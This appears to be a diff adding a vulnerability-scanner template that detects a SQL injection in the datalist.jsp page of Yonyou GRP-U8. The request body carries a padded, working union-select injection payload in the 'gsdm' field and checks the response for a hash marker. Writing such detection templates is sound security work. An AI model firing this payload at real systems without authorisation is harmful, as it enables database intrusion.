@@ -1,0 +1,34 @@
+id: poc-yaml-yongyou-grp-u8-datalist-sqli
+info:
+  name: 用友GRP-U8 datalist.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    用友GRP-U8 datalist.jsp SQL注入漏洞检测模板，发送特定POST请求并检查响应以验证漏洞。
+
+variables:
+  random: '{{rand_int(10000,99999)}}'
+  result: '{{md5(random)}}'
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/datalist.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&logindate=1111&type=zt&gsdm=1'+and+1=2+union+select+user,sys.fn_sqlvarbasetostr(HashBytes('MD5','{{random}}'))--+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "sdata"
+        part: body
+      - type: word
+        words:
+          - "{{result}}"
+        part: body
